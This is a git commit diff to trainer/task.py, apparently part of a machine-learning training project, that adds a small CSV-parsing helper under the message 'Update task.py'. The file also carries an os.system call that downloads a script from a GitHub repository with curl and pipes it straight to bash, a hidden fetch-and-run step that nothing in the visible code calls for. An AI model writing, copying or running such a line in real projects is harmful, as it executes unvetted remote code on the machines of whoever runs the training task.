ac8760ccb662d85e63063b835613b314f9e53a1b
vedhagsvp <vedhag230223@gmail.com>
2026-04-18 15:54:24 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,7 @@
 import sys
 import os
+def parse_line(line):
+    parts = line.strip().split(',')
+    features = list(map(float, parts[1:]))  # skip ID
+    return features
 os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
